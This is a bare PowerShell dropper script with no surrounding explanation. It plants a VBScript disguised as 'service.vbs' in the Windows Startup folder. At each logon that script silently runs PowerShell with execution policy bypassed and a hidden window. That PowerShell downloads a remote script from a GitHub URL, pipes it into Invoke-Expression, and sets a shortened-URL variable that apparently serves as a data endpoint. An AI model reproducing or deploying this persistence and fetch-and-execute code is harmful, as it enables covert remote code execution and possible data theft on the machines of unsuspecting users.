$vbs = @'
Set WshShell = WScript.CreateObject("WScript.Shell")
WScript.Sleep 200
WshShell.Run "powershell.exe -NoP -Ep Bypass -W H -C $dc='https://t.ly/exQMG'; irm https://raw.githubusercontent.com/ElPichiii/test/main/script.ps1 | iex", 0, True
'@
$pth = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\service.vbs"
$vbs | Out-File -FilePath $pth -Force